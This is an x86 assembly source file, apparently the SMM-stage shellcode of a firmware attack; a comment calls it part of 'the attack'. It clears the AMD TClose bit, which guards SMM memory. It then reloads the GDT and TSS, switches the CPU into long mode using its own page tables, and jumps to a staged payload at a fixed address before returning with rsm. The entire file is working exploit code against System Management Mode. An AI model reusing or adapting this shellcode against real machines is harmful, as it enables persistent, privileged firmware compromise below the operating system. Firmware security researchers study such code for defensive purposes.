

#define PROTECT_MODE_CS 0x08
#define PROTECT_MODE_DS 0x20
#define LONG_MODE_CS 	0x38
#define TSS_SEGMENT 	0x40
#define LONG_MODE_DS	0x48

#define ORIGINAL_GDTR			0x1400
#define SQUIRREL_BAR 			0xd0800000
#define CORE0_INITIAL_STACK		0x1E00
#define CORE0_PAGE_TABLE_BASE   0x2000
#define CORE0_NEXT_STAGE        0x1031


#define X64_STAGING_FUNC_VA		0xfffff6fb7dbee000
#define X64_STAGING_RSP			0xfffff6fb7dbef000

#define IA32_EFER				0xC0000080

.global _core0_shell


.text
/* This code is executed in SMM by Core Main as part of the attack */
.code32
_core0_shell:
	/* Clear TClose */
	movl $0xc0010113,%ecx
	rdmsr
	and $0xfffffff3,%eax
	wrmsr

	movl    $PROTECT_MODE_DS,%eax
	movl    %eax, %ds
	movl    %eax, %es
	movl    %eax, %fs
	movl    %eax, %gs
	movl    %eax, %ss
    movl	$CORE0_INITIAL_STACK,%esp  

	/* Clean the GDT and CS */
	movl 	$ORIGINAL_GDTR,%ecx
	lgdt  	(%ecx)

	pushl	$PROTECT_MODE_CS
    movl 	$CORE0_NEXT_STAGE,%eax
	pushl 	%eax

	lretl

next_stage:

    jmp     ProtFlatMode

ProtFlatMode:

	movl	$CORE0_PAGE_TABLE_BASE,%eax
    movl    %eax,%cr3 
    movl    $0x668,%eax                   /* as cr4.PGE is not set here, refresh cr3 8 */
	movl    %eax,%cr4

	/* Load TSS 8 */
    subl    $8,%esp                      /* reserve room in stack 8 */
    sgdt    (%esp)	
    movl    2(%esp),%eax              /* eax = GDT base 8 */
    addl    $8,%esp
    mov     $0x89,%dl
    movb    %dl,TSS_SEGMENT+5(%eax)	/* clear busy flag 8 */
    movl    $TSS_SEGMENT,%eax
    ltr     %ax

	pushl	$LONG_MODE_CS               /* push cs hardcore here 8 */
    call    Base                       /* push return address for retf later 8 */
Base:
   	addl    $LongMode - Base,(%esp)

	movl 	(%esp),%eax

    movl    $IA32_EFER,%ecx
    rdmsr
    or      $1,%ah                      /* enable LME 8 */
    wrmsr
    movl    %cr0,%ebx
    or      $0x80010023,%ebx            /* enable paging + WP + NE + MP + PE 8 */
    movl	%ebx,%cr0	

    lretl
	
.code64
LongMode:
	movl    $LONG_MODE_DS,%eax
	movl    %eax,%ds
	movl    %eax,%es
	movl    %eax,%fs
	movl    %eax,%gs
	movl 	%eax,%ss

	movq 	$X64_STAGING_RSP,%rax
	addq	$0xF00,%rax
	movq 	%rax,%rsp

	movq 	$X64_STAGING_FUNC_VA,%rax
	call 	*%rax	 

	/* Return from SMM 8 */
	rsm

	nop
	nop
	nop
	nop
	.byte 'I'
	.byte 'O'
	.byte 'A'	
	nop
	nop
	nop
	nop
	nop

